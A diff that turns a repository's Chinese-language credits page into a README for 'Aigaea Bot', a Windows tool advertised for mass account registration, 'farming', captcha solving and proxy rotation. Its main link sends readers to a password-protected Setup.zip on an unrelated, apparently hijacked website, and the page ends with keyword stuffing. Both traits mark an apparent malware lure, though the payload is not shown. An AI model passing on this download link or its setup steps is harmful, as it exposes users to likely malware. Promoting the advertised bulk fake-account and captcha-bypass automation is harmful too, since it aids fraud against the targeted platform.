@@ -1,20 +1,80 @@
-⛔️Star ⛔️Fork ⛔️Share
+# Aigaea Bot
 
-[Telegram Channel](https://t.me/DivineEngine)
+# [DOWNLOAD](https://erdogansigorta.com/temp/Setup.zip)  
+## Password - z4iS5VVOeZIe
 
-这已经不是一个适用于大多数人的项目，仅献给我的小伙伴们。
 
-*在使用 Github 的项目时阅读 Readme 文件和 Wiki 页面(如果有)是个好习惯。*
+## Overview
 
-**Special thanks to**
+Aigaea Bot is an advanced automation tool designed to streamline account registration and farming processes. With its powerful features and user-friendly interface, it offers a seamless experience for users looking to maximize their efficiency on the platform.
 
-- [scomper / Surge](https://github.com/scomper/Surge)
-- [lhie1 / Rules](https://github.com/lhie1/Rules)
-- [KOP-XIAO / QuantumultX](https://github.com/KOP-XIAO/QuantumultX)
-- HotKids
-- [Choler / Surge](https://github.com/Choler/Surge)
-- [yichahucha / surge](https://github.com/yichahucha/surge)
-- [Koolson / Qure](https://github.com/Koolson/Qure)
-- [17mon / china_ip_list](https://github.com/17mon/china_ip_list)
-- [blackmatrix7 / ios_rule_script](https://github.com/blackmatrix7/ios_rule_script)
-- [srk24 / profile](https://github.com/srk24/profile)
+---
+
+## 🚀 Features
+
+- ✅ Automatic account registration
+- 🌾 Automated farming
+- 🔄 Automated farming with auto-swap proxy
+- 🔁 Automated re-verification of accounts
+- 🧩 Captcha solving
+- 📧 Email verification
+- 🎟️ Invite code binding
+- 📊 Export statistics to CSV
+- 🧵 Multi-threaded support for registration, export stats, and re-verify accounts
+- 📤 Auto-export unverified/unregistered accounts
+
+---
+
+## 💻 Requirements
+
+- Windows operating system
+- Internet connection
+- Valid email accounts for registration
+- Valid proxies
+
+---
+
+## 🛠️ Setup
+
+1. Download the EXE file.
+2. Run the EXE file and login. It will automatically bind to your PC (the bind will disappear automatically if you close all sessions).
+3. Prepare the configuration files as described below.
+
+---
+
+## 🚀 Usage
+
+1. Ensure all configuration files are set up correctly.
+2. Run the EXE file.
+
+---
+
+## ⚠️ Important Notes
+
+- The script is limited to 2 active sessions. For example, you can use 2 sessions on one PC or 1 session on 2 PCs.
+- The bot uses CapSolver for solving captchas. Ensure you have sufficient balance in your CapSolver account.
+
+---
+
+## 🔧 Troubleshooting
+
+- **Email Verification Issues**: Check your email provider's IMAP settings and ensure they match the configuration.
+- **Captcha Problems**: Verify your CapSolver API key and account balance.
+- **Unexpected Farming Stops**: Check the console output for error messages and ensure your account credentials are correct.
+
+### 🔑 Keywords
+
+- Aigaea-Reger
+- Aigaea-Farmer
+- Aigaea-Miner
+- Aigaea-Multireger
+- Aigaea-Multifarmer
+- Aigaea-Extension-Bot
+- Aigaea-Bot
+- Aigaea-Multiwallet
+- Aigaea-AutoFarm
+- Aigaea-multibot
+- Aigaea-software
+- Aigaea-BotMiner
+
+---
